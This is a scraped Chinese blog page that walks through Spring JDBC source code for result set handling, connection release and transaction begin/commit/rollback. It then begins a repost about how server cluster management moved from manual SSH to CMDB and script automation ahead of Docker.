    }
    <span class="keyword">return</span> results;
}
</code></pre><p>&#x6216;&#x8005;</p>
<pre><code>    <span class="annotation">@Override</span>
<span class="keyword">public</span> <span class="function">SqlRowSet <span class="title">extractData</span><span class="params">(ResultSet rs)</span> <span class="keyword">throws</span> SQLException </span>{
    <span class="function"><span class="keyword">return</span> <span class="title">createSqlRowSet</span><span class="params">(rs)</span></span>;
}

<span class="comment">/**
 * Create a SqlRowSet that wraps the given ResultSet,
 * representing its data in a disconnected fashion.
 * &amp;lt;p&amp;gt;This implementation creates a Spring ResultSetWrappingSqlRowSet
 * instance that wraps a standard JDBC CachedRowSet instance.
 * Can be overridden to use a different implementation.
 * <span class="doctag">@param</span> rs the original ResultSet (connected)
 * <span class="doctag">@return</span> the disconnected SqlRowSet
 * <span class="doctag">@throws</span> SQLException if thrown by JDBC methods
 * <span class="doctag">@see</span> #newCachedRowSet
 * <span class="doctag">@see</span> org.springframework.jdbc.support.rowset.ResultSetWrappingSqlRowSet
 */</span>
<span class="keyword">protected</span> <span class="function">SqlRowSet <span class="title">createSqlRowSet</span><span class="params">(ResultSet rs)</span> <span class="keyword">throws</span> SQLException </span>{
    CachedRowSet rowSet = newCachedRowSet();
    rowSet.populate(rs);
    <span class="keyword">return</span> <span class="keyword">new</span> ResultSetWrappingSqlRowSet(rowSet);
}
</code></pre><p>4.4 &#x5173;&#x95ED;ResultSet</p>
<pre><code>/**
 * Close the given JDBC ResultSet <span class="keyword">and</span> ignore any thrown <span class="keyword">exception</span>.
 * This is useful <span class="keyword">for</span> typical <span class="keyword">finally</span> blocks <span class="keyword">in</span> manual JDBC code.
 * @param rs the JDBC ResultSet <span class="keyword">to</span> close (may be {@code <span class="keyword">null</span>})
 */
<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> closeResultSet(ResultSet rs) {
    <span class="keyword">if</span> (rs != <span class="keyword">null</span>) {
        <span class="keyword">try</span> {
            rs.close();
        }
        catch (SQLException ex) {
            logger.trace(&amp;quot;Could not close JDBC ResultSet&amp;quot;, ex);
        }
        catch (Throwable ex) {
            <span class="comment">// We don&amp;apos;t trust the JDBC driver: It might throw RuntimeException or Error.</span>
            logger.trace(&amp;quot;Unexpected <span class="keyword">exception</span> on closing JDBC ResultSet&amp;quot;, ex);
        }
    }
}
</code></pre><ol>
<li><p>&#x91CA;&#x653E;connection</p>
<p> /**</p>
<pre><code> * Close the given Connection, obtained from the given DataSource,
 * <span class="keyword">if</span> it is not managed externally (that is, not bound to the thread).
 * <span class="annotation">@param</span> con the Connection to close <span class="keyword">if</span> necessary
 * (<span class="keyword">if</span> <span class="keyword">this</span> is {<span class="annotation">@code</span> <span class="keyword">null</span>}, the call will be ignored)
 * <span class="annotation">@param</span> dataSource the DataSource that the Connection was obtained from
 * (may be {<span class="annotation">@code</span> <span class="keyword">null</span>})
 * <span class="annotation">@see</span> #getConnection
 */
<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">void</span> <span class="title">releaseConnection</span><span class="params">(Connection con, DataSource dataSource)</span> </span>{
    <span class="keyword">try</span> {
        doReleaseConnection(con, dataSource);
    }
    <span class="keyword">catch</span> (SQLException ex) {
        logger.debug(&amp;quot;Could not close JDBC Connection&amp;quot;, ex);
    }
    <span class="keyword">catch</span> (Throwable ex) {
        logger.debug(&amp;quot;Unexpected exception on closing JDBC Connection&amp;quot;, ex);
    }
}
<span class="comment">/**
 * Actually close the given Connection, obtained from the given DataSource.
 * Same as {<span class="doctag">@link</span> #releaseConnection}, but throwing the original SQLException.
 * &amp;lt;p&amp;gt;Directly accessed by {<span class="doctag">@link</span> TransactionAwareDataSourceProxy}.
 * <span class="doctag">@param</span> con the Connection to close if necessary
 * (if this is {<span class="doctag">@code</span> null}, the call will be ignored)
 * <span class="doctag">@param</span> dataSource the DataSource that the Connection was obtained from
 * (may be {<span class="doctag">@code</span> null})
 * <span class="doctag">@throws</span> SQLException if thrown by JDBC methods
 * <span class="doctag">@see</span> #doGetConnection
 */</span>
<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">void</span> <span class="title">doReleaseConnection</span><span class="params">(Connection con, DataSource dataSource)</span> <span class="keyword">throws</span> SQLException </span>{
    <span class="keyword">if</span> (con == <span class="keyword">null</span>) {
        <span class="keyword">return</span>;
    }
    <span class="keyword">if</span> (dataSource != <span class="keyword">null</span>) {
        ConnectionHolder conHolder = (ConnectionHolder) TransactionSynchronizationManager.getResource(dataSource);
        <span class="keyword">if</span> (conHolder != <span class="keyword">null</span> &amp;amp;&amp;amp; connectionEquals(conHolder, con)) {
            <span class="comment">// It&amp;apos;s the transactional Connection: Don&amp;apos;t close it.</span>
            conHolder.released();
            <span class="keyword">return</span>;
        }
    }
    logger.debug(&amp;quot;Returning JDBC Connection to DataSource&amp;quot;);
    doCloseConnection(con, dataSource);
}
</code></pre></li>
</ol>
<p>6.&#x4E8B;&#x52A1;&#x5904;&#x7406;</p>
<p>6.1 &#x4E8B;&#x52A1;&#x5F00;&#x59CB;</p>
<p>DataSourceTransactionManager&#xA0;&#x7684;doBegin()&#x65B9;&#x6CD5;</p>
<pre><code><span class="comment">/**
 * This implementation sets the isolation level but ignores the timeout.
 */</span>
@Override
protected void doBegin<span class="params">(Object transaction, TransactionDefinition definition)</span> {
    DataSourceTransactionObject txObject = <span class="params">(DataSourceTransactionObject)</span> transaction;
    Connection con = null;
    try {
        <span class="keyword">if</span> <span class="params">(txObject.getConnectionHolder<span class="params">()</span> == null ||
                txObject.getConnectionHolder<span class="params">()</span>.isSynchronizedWithTransaction<span class="params">()</span>)</span> {
            Connection newCon = this.dataSource.getConnection<span class="params">()</span>;
            <span class="keyword">if</span> <span class="params">(logger.isDebugEnabled<span class="params">()</span>)</span> {
                logger.debug<span class="params">(&amp;quot;Acquired Connection [&amp;quot; + newCon + &amp;quot;] for JDBC transaction&amp;quot;)</span>;
            }
            txObject.setConnectionHolder<span class="params">(new ConnectionHolder<span class="params">(newCon)</span>, <span class="literal">true</span>)</span>;
        }
        txObject.getConnectionHolder<span class="params">()</span>.setSynchronizedWithTransaction<span class="params">(<span class="literal">true</span>)</span>;
        con = txObject.getConnectionHolder<span class="params">()</span>.getConnection<span class="params">()</span>;
        Integer previousIsolationLevel = DataSourceUtils.prepareConnectionForTransaction<span class="params">(con, definition)</span>;
        txObject.setPreviousIsolationLevel<span class="params">(previousIsolationLevel)</span>;
        <span class="comment">// Switch to manual commit if necessary. This is very expensive in some JDBC drivers,</span>
        <span class="comment">// so we don&amp;apos;t want to do it unnecessarily (for example if we&amp;apos;ve explicitly</span>
        <span class="comment">// configured the connection pool to set it already).</span>
        <span class="keyword">if</span> <span class="params">(con.getAutoCommit<span class="params">()</span>)</span> {
            txObject.setMustRestoreAutoCommit<span class="params">(<span class="literal">true</span>)</span>;
            <span class="keyword">if</span> <span class="params">(logger.isDebugEnabled<span class="params">()</span>)</span> {
                logger.debug<span class="params">(&amp;quot;Switching JDBC Connection [&amp;quot; + con + &amp;quot;] to manual commit&amp;quot;)</span>;
            }
            con.setAutoCommit<span class="params">(<span class="literal">false</span>)</span>;
        }
        txObject.getConnectionHolder<span class="params">()</span>.setTransactionActive<span class="params">(<span class="literal">true</span>)</span>;
        int timeout = determineTimeout<span class="params">(definition)</span>;
        <span class="keyword">if</span> <span class="params">(timeout != TransactionDefinition.TIMEOUT_DEFAULT)</span> {
            txObject.getConnectionHolder<span class="params">()</span>.setTimeoutInSeconds<span class="params">(timeout)</span>;
        }
        <span class="comment">// Bind the session holder to the thread.</span>
        <span class="keyword">if</span> <span class="params">(txObject.isNewConnectionHolder<span class="params">()</span>)</span> {
            TransactionSynchronizationManager.bindResource<span class="params">(getDataSource<span class="params">()</span>, txObject.getConnectionHolder<span class="params">()</span>)</span>;
        }
    }
    catch <span class="params">(Throwable ex)</span> {
        <span class="keyword">if</span> <span class="params">(txObject.isNewConnectionHolder<span class="params">()</span>)</span> {
            DataSourceUtils.releaseConnection<span class="params">(con, this.dataSource)</span>;
            txObject.setConnectionHolder<span class="params">(null, <span class="literal">false</span>)</span>;
        }
        throw new CannotCreateTransactionException<span class="params">(&amp;quot;Could not open JDBC Connection for transaction&amp;quot;, ex)</span>;
    }
}
</code></pre><p>6.2 &#x4E8B;&#x52A1;&#x63D0;&#x4EA4;</p>
<pre><code>    @Override
protected void doCommit<span class="params">(DefaultTransactionStatus status)</span> {
    DataSourceTransactionObject txObject = <span class="params">(DataSourceTransactionObject)</span> status.getTransaction<span class="params">()</span>;
    Connection con = txObject.getConnectionHolder<span class="params">()</span>.getConnection<span class="params">()</span>;
    <span class="keyword">if</span> <span class="params">(status.isDebug<span class="params">()</span>)</span> {
        logger.debug<span class="params">(&amp;quot;Committing JDBC transaction on Connection [&amp;quot; + con + &amp;quot;]&amp;quot;)</span>;
    }
    try {
        con.commit<span class="params">()</span>;
    }
    catch <span class="params">(SQLException ex)</span> {
        throw new TransactionSystemException<span class="params">(&amp;quot;Could not commit JDBC transaction&amp;quot;, ex)</span>;
    }
}
</code></pre><p>6.3 &#x4E8B;&#x52A1;&#x56DE;&#x6EDA;</p>
<pre><code>@Override
protected void doRollback<span class="params">(DefaultTransactionStatus status)</span> {
    DataSourceTransactionObject txObject = <span class="params">(DataSourceTransactionObject)</span> status.getTransaction<span class="params">()</span>;
    Connection con = txObject.getConnectionHolder<span class="params">()</span>.getConnection<span class="params">()</span>;
    <span class="keyword">if</span> <span class="params">(status.isDebug<span class="params">()</span>)</span> {
        logger.debug<span class="params">(&amp;quot;Rolling back JDBC transaction on Connection [&amp;quot; + con + &amp;quot;]&amp;quot;)</span>;
    }
    try {
        con.rollback<span class="params">()</span>;
    }
    catch <span class="params">(SQLException ex)</span> {
        throw new TransactionSystemException<span class="params">(&amp;quot;Could not roll back JDBC transaction&amp;quot;, ex)</span>;
    }
}
</code></pre><p>&#x5C0F;&#x7ED3;&#xFF1A;</p>
<pre><code><span class="tag">JdbcTemplate</span>&amp;<span class="id">#x5C06</span>;&amp;<span class="id">#x6211</span>;&amp;<span class="id">#x4EEC</span>;&amp;<span class="id">#x4F7F</span>;&amp;<span class="id">#x7528</span>;&amp;<span class="id">#x7684</span>;<span class="tag">JDBC</span>&amp;<span class="id">#x7684</span>;&amp;<span class="id">#x6D41</span>;&amp;<span class="id">#x7A0B</span>;&amp;<span class="id">#x5C01</span>;&amp;<span class="id">#x88C5</span>;&amp;<span class="id">#x8D77</span>;&amp;<span class="id">#x6765</span>;&amp;<span class="id">#xFF0C</span>;&amp;<span class="id">#x5305</span>;&amp;<span class="id">#x62EC</span>;&amp;<span class="id">#x4E86</span>;&amp;<span class="id">#x5F02</span>;&amp;<span class="id">#x5E38</span>;&amp;<span class="id">#x7684</span>;&amp;<span class="id">#x6355</span>;&amp;<span class="id">#x6349</span>;&amp;<span class="id">#x3001</span>;<span class="tag">SQL</span>&amp;<span class="id">#x7684</span>;&amp;<span class="id">#x6267</span>;&amp;<span class="id">#x884C</span>;&amp;<span class="id">#x3001</span>;&amp;<span class="id">#x67E5</span>;&amp;<span class="id">#x8BE2</span>;&amp;<span class="id">#x7ED3</span>;&amp;<span class="id">#x679C</span>;&amp;<span class="id">#x7684</span>;&amp;<span class="id">#x8F6C</span>;&amp;<span class="id">#x6362</span>;&amp;<span class="id">#x7B49</span>;&amp;<span class="id">#x7B49</span>;&amp;<span class="id">#x3002</span>;  
</code></pre><p>spring&#x5927;&#x91CF;&#x4F7F;&#x7528;Template Method&#x6A21;&#x5F0F;&#x6765;&#x5C01;&#x88C5;&#x56FA;&#x5B9A;&#x6D41;&#x7A0B;&#x7684;&#x52A8;&#x4F5C;&#xFF0C;XXXTemplate&#x7B49;&#x7C7B;&#x522B;&#x90FD;&#x662F;&#x57FA;&#x4E8E;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x7684;&#x5B9E;&#x73B0;&#x3002;<br> &#x9664;&#x4E86;&#x5927;&#x91CF;&#x4F7F;&#x7528;Template Method&#x6765;&#x5C01;&#x88C5;&#x4E00;&#x4E9B;&#x5E95;&#x5C42;&#x7684;&#x64CD;&#x4F5C;&#x7EC6;&#x8282;&#xFF0C;spring&#x4E5F;&#x5927;&#x91CF;&#x4F7F;&#x7528;callback&#x65B9;&#x5F0F;&#x7C7B;&#x56DE;&#x8C03;&#x76F8;&#x5173;&#x7C7B;&#x522B;&#x7684;&#x65B9;&#x6CD5;&#x4EE5;&#x63D0;&#x4F9B;JDBC&#x76F8;&#x5173;&#x7C7B;&#x522B;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4F7F;&#x4F20;&#x7EDF;&#x7684;JDBC&#x7684;&#x4F7F;&#x7528;&#x8005;&#x4E5F;&#x80FD;&#x6E05;&#x695A;&#x4E86;&#x89E3;spring&#x6240;&#x63D0;&#x4F9B;&#x7684;&#x76F8;&#x5173;&#x5C01;&#x88C5;&#x7C7B;&#x522B;&#x65B9;&#x6CD5;&#x7684;&#x4F7F;&#x7528;&#x3002;</p>
<p>&#x8D5E;&#x4E00;&#x4E2A; &#x6536; &#x85CF; </p>
<p> &#x63A8;&#x8350;&#x6587;&#x7AE0;</p>
<ul>
<li>1.<a href="/articles/meYF3ir">Java&#x77E5;&#x591A;&#x5C11;&#xFF08;85&#xFF09;&#x6587;&#x672C;&#x6846;&#x548C;&#x6587;&#x672C;&#x533A;</a></li>
<li>2.<a href="/articles/b2eMne7">&#x518D;&#x56DE;&#x9996;&#xFF0C;Java&#x6E29;&#x6545;&#x77E5;&#x65B0;&#xFF08;&#x516B;&#xFF09;&#xFF1A;Java&#x57FA;&#x7840;&#x4E4B;&#x5B57;&#x7B26;&#x4E32;</a></li>
<li>3.<a href="/articles/za2Efm3">Java PermGen &#x53BB;&#x54EA;&#x91CC;&#x4E86;?</a></li>
<li>4.<a href="/articles/677JjyM">&#x4F7F;&#x7528;Ant&#x81EA;&#x52A8;&#x5316;&#x6211;&#x4EEC;&#x7684;java&#x9879;&#x76EE;&#x751F;&#x6210;</a></li>
<li>5.<a href="/articles/y6jEj23">Java&#x77E5;&#x591A;&#x5C11;&#xFF08;84&#xFF09;&#x56FE;&#x5F62;&#x754C;&#x9762;&#x4E4B;&#x5E03;&#x5C40;&#x8BBE;&#x8BA1;</a></li>
<li><p>6.<a href="/articles/vaMvIzm">&#x5173;&#x4E8E;Java&#x914D;&#x7F6E;&#x6587;&#x4EF6;properties&#x7684;&#x5B66;&#x4E60;</a></p>
<p>&#x76F8;&#x5173;&#x5FAE;&#x535A; <a href="/articles/weibo_list/jMVF7bI">()</a></p>
</li>
</ul>
<h5 id="&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;">&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;</h5><p>&#x9519;&#x8BEF; </p>
<p> &#x767B;&#x5F55;&#x540E;&#x8BC4;&#x8BBA; &#x5DF2;&#x53D1;&#x8868;&#x8BC4;&#x8BBA;&#x6570;( ) </p>
<p>&#x6CA1;&#x6709;&#x66F4;&#x591A;&#x8BC4;&#x8BBA;&#x4E86;^^ </p>
<p>&#x66F4;&#x591A;&#x8BC4;&#x8BBA;</p>
<p>&#x8BC4;&#x8BBA;&#x52A0;&#x8F7D;&#x5931;&#x8D25;&#xFF0C;<a href="javascript:reload_comments(&apos;jMVF7bI&apos;,1,0,-1);" target="_blank" rel="external">&#x91CD;&#x65B0;&#x52A0;&#x8F7D;</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/transcribe/">transcribe</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/JDBC/">JDBC</a><a href="/tags/Spring/">Spring</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2015/06/07/6676495/" title="闲谈集群管理模式 -" itemprop="url">闲谈集群管理模式 -</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="edwin" target="_blank" itemprop="author">edwin</a>
		
  <p class="article-time">
    <time datetime="2015-06-06T22:24:37.000Z" itemprop="datePublished"> 发表于 2015-06-07</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h1 id="&#x95F2;&#x8C08;&#x96C6;&#x7FA4;&#x7BA1;&#x7406;&#x6A21;&#x5F0F;">&#x95F2;&#x8C08;&#x96C6;&#x7FA4;&#x7BA1;&#x7406;&#x6A21;&#x5F0F;</h1><p> &#x65F6;&#x95F4;&#xA0;2015-06-07 08:53:26  <a href="/sites/3uEjYv">segmentfault-&#x535A;&#x5BA2;</a></p>
<p><em>&#x539F;&#x6587;</em>&#xA0; <a href="http://segmentfault.com/a/1190000002882567?utm_source=tuicool" target="_blank" rel="external">http://segmentfault.com/a/1190000002882567</a></p>
<p> &#x4E3B;&#x9898; <a href="/topics/11000085">&#x8FD0;&#x7EF4;&#x6280;&#x672F;</a></p>
<p>docker&#x5F88;&#x706B;&#x5F88;&#x7EA2;&#xFF0C;&#x7B80;&#x76F4;&#x5230;&#x4E86;&#x6CA1;&#x6709;&#x9053;&#x7406;&#x7684;&#x5730;&#x6B65;&#x4E86;&#x3002;docker&#x4E3A;&#x4EC0;&#x4E48;&#x8FD9;&#x4E48;&#x7EA2;&#xFF1F;&#x56E0;&#x4E3A;&#x5B83;&#x662F;&#x4E00;&#x79CD;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x6380;&#x684C;&#x5B50;&#x7684;&#x6280;&#x672F;&#x3002;&#x5728;&#x90E8;&#x7F72;&#x81EA;&#x52A8;&#x5316;&#x8FD9;&#x6761;&#x4EA7;&#x4E1A;&#x4E0A;&#x7684;&#x5DE5;&#x4EBA;&#x548C;&#x673A;&#x5E8A;&#x5236;&#x9020;&#x5546;&#x4EEC;&#xFF0C;&#x770B;&#x5BB6;&#x62A4;&#x9662;&#x7684; cmdb&#xFF0C;&#x5206;&#x5E03;&#x5F0F;&#x811A;&#x672C;&#x6267;&#x884C;&#x7B49;&#x6240;&#x8C13;&#x6838;&#x5FC3;&#x6280;&#x672F;&#x5373;&#x4FBF;&#x4E0D;&#x4F1A;&#x53D8;&#x6210;&#x660E;&#x65E5;&#x9EC4;&#x82B1;&#xFF0C;&#x4E5F;&#x4F1A;&#x6CA6;&#x4E3A;&#x4E8C;&#x6434;&#xFFFD;&#xFFFD;&#x6280;&#x672F;&#x3002;&#x4EC5;&#x4EC5;&#x628A; docker &#x5F53;&#x6210;&#x4E00;&#x4E2A;&#x8F7B;&#x91CF;&#x7EA7; vmware &#x6765;&#x4F7F;&#x7528;&#xFF0C;&#x662F;&#x6CA1;&#x6CD5;&#x770B;&#x7A7F;&#x5176;&#x5B9E;&#x8D28;&#x7684;&#x3002;&#x8981;&#x7406;&#x89E3; docker &#x7684;&#x610F;&#x4E49;&#xFF0C;&#x4E0D;&#x80FD;&#x4ECE; docker &#x662F;&#x4EC0;&#x4E48;&#xFF0C;&#x80FD;&#x591F;&#x5E72;&#x4EC0;&#x4E48;&#x8BF4;&#x8D77;&#x3002;&#x8BA9;&#x6211;&#x4EEC;&#x5148;&#x6765;&#x56DE;&#x5FC6;&#x4E00;&#x4E0B;&#x96C6;&#x7FA4;&#x7BA1;&#x7406;&#x6A21;&#x5F0F;&#x7684;&#x53D1;&#x5C55;&#x5386;&#x7A0B;&#xFF0C;&#x4EE5;&#x53CA;&#x8FD9;&#x4E9B;&#x843D;&#x540E;&#x7684;&#x6A21;&#x5F0F;&#x7684;&#x79CD;&#x79CD;&#x5F0A;&#x7AEF;&#x3002;</p>
<h2 id="&#x624B;&#x5DE5;&#x7BA1;&#x7406;&#x65F6;&#x4EE3;">&#x624B;&#x5DE5;&#x7BA1;&#x7406;&#x65F6;&#x4EE3;</h2><p>IP&#x5730;&#x5740;&#x662F;&#x653E;&#x5728; excel &#x8868;&#x91CC;&#x7684;&#x3002;&#x7BA1;&#x7406;&#x662F;&#x9760;&#x767B;&#x9646;&#x8DF3;&#x677F;&#x673A;&#xFF0C;&#x7528; SSH &#x8FDE;&#x63A5;&#x670D;&#x52A1;&#x5668;&#x3002;&#x624B;&#x5DE5;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x505A;&#x65B0;&#x7684;&#x670D;&#x52A1;&#x5668;&#x90E8;&#x7F72;&#xFF0C;&#x5DF2;&#x6709;&#x670D;&#x52A1;&#x5668;&#x7684;&#x7A0B;&#x5E8F;&#x7248;&#x672C;&#x5347;&#x7EA7;&#xFF0C;&#x4EE5;&#x53CA;&#x5404;&#x79CD;&#x914D;&#x7F6E;&#x5237;&#x65B0;&#x4FEE;&#x6539;&#x7684;&#x5DE5;&#x4F5C;&#x3002;&#x5F0A;&#x7AEF;&#x4E0D;&#x8A00;&#x800C;&#x55BB;&#xFF0C;&#x4E3B;&#x8981;&#x6709;&#x8FD9;&#x4E48;&#x51E0;&#x70B9;&#xFF1A; </p>
<ul>
<li>&#x7F3A;&#x4E4F;&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x56E0;&#x4E3A;&#x662F;&#x624B;&#x5DE5;&#x64CD;&#x4F5C;&#x6240;&#x4EE5;&#x670D;&#x52A1;&#x5668;&#x4E4B;&#x95F4;&#x603B;&#x662F;&#x6709;&#x4E00;&#x4E9B;&#x5DEE;&#x5F02;</li>
<li>&#x6548;&#x7387;&#x4F4E;&#x4E0B;&#xFF0C;&#x4E00;&#x4E2A;&#x4EBA;&#x53EF;&#x4EE5;&#x7BA1;&#x7406;&#x7684;&#x670D;&#x52A1;&#x5668;&#x6570;&#x91CF;&#x975E;&#x5E38;&#x6709;&#x9650;</li>
</ul>
<h2 id="&#x81EA;&#x52A8;&#x5316;&#x5927;&#x8DC3;&#x8FDB;&#x65F6;&#x4EE3;">&#x81EA;&#x52A8;&#x5316;&#x5927;&#x8DC3;&#x8FDB;&#x65F6;&#x4EE3;</h2><p>&#x4E1A;&#x52A1;&#x6570;&#x91CF;&#x7684;&#x589E;&#x957F;&#xFF0C;&#x5F88;&#x5FEB;&#x4F7F;&#x5F97;&#x673A;&#x5668;&#x7684;&#x6570;&#x91CF;&#x8D85;&#x8FC7;&#x624B;&#x5DE5;&#x64CD;&#x4F5C;&#x7EF4;&#x62A4;&#x7684;&#x6781;&#x9650;&#x3002;&#x65E0;&#x8BBA;&#x518D;&#x70C2;&#x7684;&#x56E2;&#x961F;&#xFF0C;&#x53EA;&#x8981;&#x4E1A;&#x52A1;&#x957F;&#x5230;&#x8FD9;&#x4E2A;&#x4EFD;&#x4E0A;&#x4E86;&#xFF0C;&#x5FC5;&#x7136;&#x4F1A;&#x51FA;&#x73B0;&#x5927;&#x91CF;&#x7684;&#x81EA;&#x52A8;&#x5316;&#x5DE5;&#x5177;&#x7528;&#x811A;&#x672C;&#x81EA;&#x52A8;&#x5316;&#x6267;&#x884C;&#x7684;&#x65B9;&#x5F0F;&#x5FEB;&#x901F;&#x5730;&#x652F;&#x6491;&#x4E1A;&#x52A1;&#x3002;&#x8FD9;&#x4E2A;&#x65F6;&#x4EE3;&#x662F;&#x4E00;&#x4E2A;&#x9EC4;&#x91D1;&#x65F6;&#x4EE3;&#xFF0C;&#x8FD0;&#x7EF4;&#x771F;&#x6B63;&#x957F;&#x8138;&#x7684;&#x65F6;&#x4EE3;&#x3002;&#x56E0;&#x4E3A;&#x6CA1;&#x6709;&#x81EA;&#x52A8;&#x5316;&#x7684;&#x8FD0;&#x7EF4;&#x6280;&#x672F;&#xFF0C;&#x4E1A;&#x52A1;&#x5C31;&#x4F1A;&#x9047;&#x5230;&#x74F6;&#x9888;&#x3002;&#x81EA;&#x52A8;&#x5316;&#x6280;&#x672F;&#x7684;&#x5F15;&#x5165;&#xFF0C;&#x5207;&#x5B9E;&#x5730;&#x4F53;&#x73B0;&#x6210;&#x4E86;&#x4E1A;&#x52A1;&#x7684;&#x6536;&#x76CA;&#x3002;&#x8FD9;&#x65F6;&#x4EE3;&#x7684;&#x7279;&#x5F81;&#x662F;&#x4E24;&#x4E2A;&#x5173;&#x952E;&#xFFFD;&#xFFFD;&#xFFFD;&#x7CFB;&#x7EDF; </p>
<ul>
<li>&#x628A;&#x672C;&#x5730; excel &#x8868;&#x683C;&#x91CC;&#x7684; IP &#x5730;&#x5740;&#x7528;&#x6570;&#x636E;&#x5E93;&#x7684;&#x65B9;&#x5F0F;&#x7BA1;&#x7406;&#x8D77;&#x6765;&#xFF0C;&#x79F0;&#x4E4B;&#x4E3A; CMDB</li>
<li>&#x57FA;&#x4E8E; ssh &#x6216;&#x8005; agent &#x7684;&#x5206;&#x5E03;&#x5F0F;&#x811A;&#x672C;&#x6267;&#x884C;&#x5E73;&#x53F0;</li>
</ul>
<p>&#x6548;&#x7387;&#x4F4E;&#x4E0B;&#x4E86;&#x4E0D;&#x518D;&#x662F;&#x4E3B;&#x8981;&#x95EE;&#x9898;&#xFF0C;&#x4E3B;&#x8981;&#x7684;&#x5F0A;&#x7AEF;&#x53D8;&#x4E3A;&#x4E86;&#xFF1A;</p>
<ul>
<li>&#x5927;&#x91CF;&#x7684;&#x811A;&#x672C;&#xFF0C;&#x6742;&#x4E71;&#x65E0;&#x7AE0;&#xFF0C;&#x5185;&#x5BB9;&#x91CD;&#x590D;&#xFF0C;&#x8D28;&#x91CF;&#x96BE;&#x4EE5;&#x4FDD;&#x8BC1;&#xFF0C;&#x6700;&#x7EC8;&#x7ED9;&#x6545;&#x969C;&#x7559;&#x4E0B;&#x9690;&#x60A3;</li>
<li>&#x6CA1;&#x6709;&#x5BF9;&#x73B0;&#x7F51;&#x9884;&#x671F;&#x72B6;&#x6001;&#x7684;&#x5B9A;&#x4E49;&#x548C;&#x7BA1;&#x7406;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x73B0;&#x7F51;&#x72B6;&#x6001;&#x90FD;&#x662F;&#x811A;&#x672C;&#x65E5;&#x79EF;&#x6708;&#x7D2F;&#x7684;&#x4EA7;&#x7269;&#xFF0C;&#x5BFC;&#x81F4;&#x670D;&#x52A1;&#x5668;&#x72B6;&#x6001;&#x6F02;&#x79FB;&#xFF0C;&#x4EA7;&#x751F;&#x96EA;&#x82B1;&#x670D;&#x52A1;&#x5668;&#xFF08;&#x6BCF;&#x4E2A;&#x673A;&#x5668;&#x90FD;&#x4E0D;&#x4E00;&#x6837;&#xFF09;&#xFF0C;&#x8FDB;&#x800C;&#x7ED9;&#x4E1A;&#x52A1;&#x7A33;&#x5B9A;&#x6027;&#x7559;&#x4E0B;&#x9690;&#x60A3;</li>
</ul>
<p>&#x8FD9;&#x4E9B;&#x5F0A;&#x7AEF;&#x77ED;&#x671F;&#x5BF9;&#x4E1A;&#x52A1;&#x6765;&#x8BF4;&#x5E76;&#x6CA1;&#x6709;&#x7ACB;&#x7AFF;&#x89C1;&#x5F71;&#x7684;&#x4F24;&#x5BB3;&#xFF0C;&#x5C5E;&#x4E8E;&#x5185;&#x4F24;&#x578B;&#x7684;&#x3002;&#x800C;&#x4E14;&#x5F88;&#x591A;&#x9690;&#x60A3;&#x5373;&#x4FBF;&#x66B4;&#x9732;&#x4E86;&#x4E5F;&#x4F1A;&#x6D41;&#x4E8E;&#x5F3A;&#x8C03;&#x7EAA;&#x5F8B;&#xFF0C;&#x5F3A;&#x8C03;&#x8FD0;&#x7EF4;&#x610F;&#x8BC6;&#x4E91;&#x4E91;&#x3002;&#x5F88;&#x5C11;&#x4F1A;&#x6709;&#x4EBA;&#x53BB;&#x8FFD;&#x7A76;&#x80CC;&#x540E;&#x7684;&#x8FD0;&#x7EF4;&#x7406;&#x5FF5;&#x7684;&#x95EE;&#x9898;&#x3002;&#x7ED3;&#x679C;&#x5C31;&#x662F;&#x5927;&#x90E8;&#x5206;&#x516C;&#x53F8;&#x90FD;&#x505C;&#x7559;&#x5728;&#x8FD9;&#x4E2A;&#x9636;&#x6BB5;&#x4E86;&#x3002;&#x6BD5;&#x7ADF;&#x8FD0;&#x7EF4;&#x662F;&#x4E00;&#x4E2A;&#x8DB3;&#x591F;&#x7528;&#x5373;&#x53EF;&#x7684;&#x652F;&#x6491;&#x9886;&#x57DF;&#x3002;&#x8FD0;&#x7EF4;&#x641E;&#x5F97;&#x518D;&#x9AD8;&#x79D1;&#x6280;&#xFF0C;&#x7279;&#x9AD8;&#x53EF;&#x7528;&#xFF0C;&#x672A;&#x5FC5;&#x548C;&#x521B;&#x4E1A;&#x516C;&#x53F8;&#x7684;&#x6210;&#x529F;&#x6709;&#x591A;&#x5C11;&#x76F4;&#x63A5;&#x8054;&#x7CFB;&#x3002;</p>
